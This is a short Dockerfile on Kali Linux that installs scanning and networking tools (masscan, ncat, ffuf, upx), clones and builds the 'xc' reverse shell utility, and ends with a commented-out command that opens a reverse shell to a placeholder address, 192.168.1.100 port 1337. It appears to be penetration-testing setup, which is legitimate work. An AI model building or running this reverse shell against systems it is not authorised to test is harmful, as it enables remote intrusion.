FROM kalilinux/kali-rolling
RUN apt-get update
RUN apt-get -y install rlwrap upx python3 masscan net-tools tcpdump iputils-ping iputils-arping bind9-dnsutils whois geoip-database geoip-bin ncat curl wget ffuf golang git
RUN GO111MODULE=off go get golang.org/x/sys/...
RUN GO111MODULE=off go get golang.org/x/text/encoding/unicode
RUN GO111MODULE=off go get github.com/hashicorp/yamux
RUN git clone --recurse-submodules https://github.com/xct/xc
WORKDIR /xc
RUN python3 ./build.py

# Replace IP and uncomment to start reverse shell by running docker run -it tag-of-this-one
# CMD [ "/xc/xc", "192.168.1.100", "1337" ]
